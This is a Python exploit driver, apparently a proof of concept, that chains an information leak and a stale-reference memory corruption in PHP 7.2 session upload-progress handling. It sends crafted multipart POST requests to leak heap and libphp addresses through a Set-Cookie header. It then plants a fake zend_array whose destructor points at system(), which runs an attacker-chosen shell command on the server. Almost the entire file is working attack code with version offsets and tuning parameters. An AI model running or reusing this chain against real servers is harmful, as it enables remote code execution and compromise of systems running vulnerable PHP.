#!/usr/bin/env python3
"""chain72 — post_max=8M end-to-end chain driver.

Modes
  leakpair   arm1 (NUL sid, OOM inside php_session_send_cookie) + chain9 consumer
             -> Set-Cookie with both bases; writes cookie72.hex (via drive),
                prints CHUNK_BASE / LIBPHP_BASE.
  firepair   arm2 (two-part valid sid, OOM after track_init) + carrier consumer
             whose 615-byte values are the fake reference/array blob for
             (table, system, cmd). No session fields in the consumer, so the
             stale ps_globals reach request shutdown untouched.
  full       leakpair -> decode -> R0 = CHUNK + K + 0x69018 -> firepair.

The stale zend_reference (PS(http_session_vars) value) for the arm2 shape sits at
MAIN_CHUNK + 0x69018 (measured, probe5/probe9); MAIN = leaked CHUNK_BASE + K.
"""
import argparse, json, os, re, struct, subprocess, sys, time, urllib.parse
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import drive as D

BND = D.BND
DTOR = 0x50F8F0          # 7.2.21 _zval_ptr_dtor (stored pDestructor delta 0)
REF_OFF = 0x69018        # stale http_session_vars zend_reference, main chunk
MAIN_K = 0xBE00000       # MAIN_CHUNK - leaked CHUNK_BASE (verify per generation)

def blob(table, system, cmd, refcount=1):
    """615-byte fake reference + zend_array + bucket + zend_string + cmd."""
    b = bytearray(615)
    struct.pack_into("<II", b, 0x00, refcount, 10)   # refcount, IS_REFERENCE
    struct.pack_into("<Q", b, 0x08, table)           # ref.val.arr
    struct.pack_into("<I", b, 0x10, 0x1407)          # IS_ARRAY
    struct.pack_into("<I", b, 0x14, 0)
    t = 0x18                                          # zend_array at ref+0x18
    struct.pack_into("<II", b, t + 0x00, 1, 7)       # bucket val (IS_ARRAY)
    struct.pack_into("<II", b, t + 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", b, t + 0x10, table + 0x20)
    struct.pack_into("<II", b, t + 0x18, 1, 1)
    struct.pack_into("<I", b, t + 0x20, 8)
    struct.pack_into("<Q", b, t + 0x30, system)      # pDestructor = zif_system
    struct.pack_into("<I", b, t + 0x4C, 1)
    struct.pack_into("<Q", b, t + 0x70, table + 0x80)
    struct.pack_into("<I", b, t + 0x78, 6)
    struct.pack_into("<II", b, t + 0x80, 1, 6)
    struct.pack_into("<Q", b, t + 0x90, len(cmd))    # zend_string.len
    b[t + 0x98:t + 0x98 + len(cmd)] = cmd            # zend_string.val
    return bytes(b)


def arm2_long_body(nh1, nh2, nlong, sid=b"\x00", hdr=b"a:\n", lhdr=b"a"*23 + b":\n"):
    """arm2 with `nlong` long-named (bin-24 key) headers at the start of part 1.
    Those keys stay alive until the part body is read, so they exhaust the
    bin-24 free list before php_session_track_init runs at FILE_START."""
    bnd = b"--" + D.BND.encode() + b"\r\n"
    return b"".join([
        D.part("PHPSESSID", sid), D.part("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
        D.filepart_head(b"f", b"a.txt") + lhdr * nlong + hdr * nh1 + b"\r\n" + b"AAAA" + b"\r\n",
        bnd,
        D.filepart_head(b"g", b"b.txt") + hdr * nh2 + b"\r\n" + b"BBBB" + b"\r\n",
        b"--" + D.BND.encode() + b"--\r\n"])

def fire_body(ncarrier, table, system, cmd, name_len=8, safe=False,
              padlen=0, tail=True, blob_at=None, pre=0, prelen=200,
              flood=0, primlen=82000):
    """Marker field + N unique plain fields (value = blob) + optional 'pad'
    filler + optional PHPSESSID/PROGRESS tail (END-event session init).

    blob_at: byte offset in the body where the blob is written instead of the
    'Z' filler -- the raw body copy lives in the request's stream buffer, so
    this plants the fake reference at a measured heap address."""
    v = blob(table, system, cmd, refcount=2 if safe else 1)
    c = [D.part("MKMMMMMM", b"")]
    for i in range(pre):
        c.append(D.part(D.uname("p", i, 8), b"P" * prelen))
    for i in range(ncarrier):
        c.append(D.part(D.uname("r", i, name_len), v))
    if padlen:
        c.append(D.part("pad", b"Z" * padlen))
    if flood:
        c.append(D.filepart_head(b"g", b"b.txt") + b"a:" + b"H" * primlen + b"\n"
                 + b"a:\n" * flood + b"\r\n" + b"BBBB" + b"\r\n")
    if tail:
        c.append(D.part("PHPSESSID", b"a" * 32))
        c.append(D.part("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"))
    c.append(b"--" + BND.encode() + b"--\r\n")
    body = bytearray(b"".join(c))
    if blob_at is not None:
        if blob_at < 0 or blob_at + len(v) > len(body):
            raise SystemExit("blob_at out of range (%d, body %d)" % (blob_at, len(body)))
        body[blob_at:blob_at + len(v)] = v
    return bytes(body)

def decode(cookie_hex_path=None):
    raw = bytes.fromhex(open(cookie_hex_path or D.COOKIE_OUT).read().strip())
    m = re.match(rb"Set-Cookie:\s*PHPSESSID=([^;]*)", raw)
    if not m:
        return None
    data = urllib.parse.unquote_to_bytes(m.group(1))
    import collections
    votes = collections.Counter()
    for off in range(0, len(data) - 8, 8):
        q = struct.unpack_from("<Q", data, off)[0]
        if 0x7F0000000000 <= q < 0x800000000000:
            votes[q & ~0x1FFFFF] += 1
    lib = collections.Counter()
    ht = 0
    for off in range(0, len(data) - 0x38, 8):
        if data[off + 4] != 7:
            continue
        ar = struct.unpack_from("<Q", data, off + 0x10)[0]
        dt = struct.unpack_from("<Q", data, off + 0x30)[0]
        if not (0x7F0000000000 <= ar < 0x800000000000):
            continue
        if not (0x7F0000000000 <= dt < 0x800000000000):
            continue
        ht += 1
        b = dt - DTOR
        if b & 0xFFF == 0 and 0x7F0000000000 <= b < 0x800000000000:
            lib[b] += 1
    return {"decoded": len(data), "votes": votes.most_common(3), "ht": ht,
            "libphp": lib.most_common(3),
            "chunk": votes.most_common(1)[0][0] if votes else None}

def main():
    global DTOR, ZIF_OFF
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", choices=["leakpair", "firepair", "full"], required=True)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=7211)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--nh1", type=int, default=1299500)
    ap.add_argument("--nh2", type=int, default=1000)
    ap.add_argument("--nlong", type=int, default=0)
    ap.add_argument("--cool", type=int, default=0)
    ap.add_argument("--flood", type=int, default=0)
    ap.add_argument("--primlen2", type=int, default=82000)
    ap.add_argument("--sid", default="61" * 32)
    ap.add_argument("--leak-plan", default="arm,chain9:614000:40:1:77:60000:0")
    ap.add_argument("--carlen", type=int, default=84000)
    ap.add_argument("--primlen", type=int, default=82000)
    ap.add_argument("--ncarrier", type=int, default=760)
    ap.add_argument("--pre", type=int, default=0)
    ap.add_argument("--prelen", type=int, default=200)
    ap.add_argument("--padlen", type=int, default=0)
    ap.add_argument("--blob-at", type=lambda x: int(x, 0), default=-1)
    ap.add_argument("--notail", action="store_true")
    ap.add_argument("--cmd", default="id>/tmp/p72proof;id>>/tmp/p72proof;ls -l /tmp/p72proof>>/tmp/p72proof")
    ap.add_argument("--table", default="0x0")
    ap.add_argument("--system", default="0x0")
    ap.add_argument("--ref-off", type=lambda x: int(x, 0), default=REF_OFF)
    ap.add_argument("--main-k", type=lambda x: int(x, 0), default=MAIN_K)
    ap.add_argument("--dtor", type=lambda x: int(x, 0), default=DTOR,
                    help="version _zval_ptr_dtor offset (7.2.34=0x441b20)")
    ap.add_argument("--zif", type=lambda x: int(x, 0), default=0x430870,
                    help="version zif_system offset (7.2.34=0x3624e0)")
    ap.add_argument("--gap", type=float, default=0.4)
    ap.add_argument("--json", default="")
    ap.add_argument("--hold", action="store_true", help="keep connections open")
    ap.add_argument("--safe", action="store_true", help="refcount=2 calibration blob")
    a = ap.parse_args()
    DTOR = a.dtor
    ZIF_OFF = a.zif
    out = {"mode": a.mode, "port": a.port}

    def leak_pair():
        c = D.Conn(a.host, a.port, False)
        res = {}
        try:
            # plan is executed on one keep-alive connection by drive's loop;
            # re-implemented here so the connection can be held open afterwards.
            for st in [s.strip() for s in a.leak_plan.split(",") if s.strip()]:
                if st == "arm":
                    body = D.arm_body(1299780, b"a:\n", b"\x00")
                    r = c.post(a.path, body, False, maxread=65536)
                    res["arm"] = {"status": r["status"], "len": r["total"],
                                  "body": r["body"][:120].decode("latin-1", "replace"),
                                  "closed": r["closed"]}
                    time.sleep(a.gap)
                elif st.startswith("chain9:"):
                    f = [int(x) for x in st.split(":")[1:]]
                    na, npred, depth, k, nb = f[:5]
                    payhdr = f[5] if len(f) > 5 else 0x18
                    body = D.chain9_body(na, npred, depth, k, nb, a.carlen,
                                         a.primlen, payhdr=payhdr)
                    r = c.post(a.path, body, False, maxread=8 << 20)
                    sc = r["headers"].get("set-cookie", "")
                    open(D.COOKIE_OUT, "w").write(
                        ("Set-Cookie: " + sc).encode().hex())
                    res["leak"] = {"status": r["status"], "wire": len(body),
                                   "set_cookie_len": len(sc), "closed": r["closed"]}
                    time.sleep(a.gap)
        finally:
            if not a.hold:
                c.close()
        res["conn"] = c
        return res

    def fire_pair(table, system, cmd):
        c = D.Conn(a.host, a.port, False)
        res = {}
        try:
            for _ in range(a.cool):
                c.get(a.path)
                time.sleep(0.01)
            body = (arm2_long_body(a.nh1, a.nh2, a.nlong, bytes.fromhex(a.sid))
                    if a.nlong else D.arm2_body(a.nh1, a.nh2, bytes.fromhex(a.sid)))
            r = c.post(a.path, body, False, maxread=65536)
            res["arm"] = {"status": r["status"], "wire": len(body),
                          "body": r["body"][:200].decode("latin-1", "replace"),
                          "closed": r["closed"]}
            time.sleep(a.gap)
            fbody = fire_body(a.ncarrier, table, system, cmd.encode(), safe=a.safe,
                              padlen=a.padlen, tail=not a.notail,
                              blob_at=a.blob_at if a.blob_at >= 0 else None,
                              pre=a.pre, prelen=a.prelen,
                              flood=a.flood, primlen=a.primlen2)
            r = c.post(a.path, fbody, False, maxread=1 << 20)
            res["fire"] = {"status": r["status"], "wire": len(fbody),
                           "body": r["body"][:200].decode("latin-1", "replace"),
                           "closed": r["closed"]}
        finally:
            if not a.hold:
                c.close()
        res["conn"] = c
        return res

    if a.mode == "leakpair":
        lp = leak_pair()
        out["leakpair"] = {k: v for k, v in lp.items() if k != "conn"}
        dec = decode()
        out["decode"] = dec
        if dec and dec.get("chunk"):
            out["main"] = dec["chunk"] + a.main_k
            out["ref"] = out["main"] + a.ref_off
            if dec["libphp"]:
                out["table"] = out["ref"] + 0x18
                out["system"] = dec["libphp"][0][0] + ZIF_OFF
        if not a.hold:
            lp["conn"].close()
    elif a.mode == "firepair":
        table = int(a.table, 0)
        system = int(a.system, 0)
        out["table"], out["system"] = table, system
        fp = fire_pair(table, system, a.cmd)
        out["firepair"] = {k: v for k, v in fp.items() if k != "conn"}
        if not a.hold:
            fp["conn"].close()
    else:
        lp = leak_pair()
        out["leakpair"] = {k: v for k, v in lp.items() if k != "conn"}
        dec = decode()
        out["decode"] = dec
        if not (dec and dec.get("chunk") and dec["libphp"]):
            out["error"] = "leak incomplete"
        else:
            main = dec["chunk"] + a.main_k
            ref = main + a.ref_off
            table = ref + 0x18
            system = dec["libphp"][0][0] + ZIF_OFF
            out.update(main=main, ref=ref, table=table, system=system)
            fp = fire_pair(table, system, a.cmd)
            out["firepair"] = {k: v for k, v in fp.items() if k != "conn"}
            if not a.hold:
                fp["conn"].close()
        if not a.hold:
            lp["conn"].close()
    print(json.dumps({k: v for k, v in out.items()}, indent=1, default=str))
    if a.json:
        open(a.json, "w").write(json.dumps(out, indent=1, default=str))

if __name__ == "__main__":
    main()
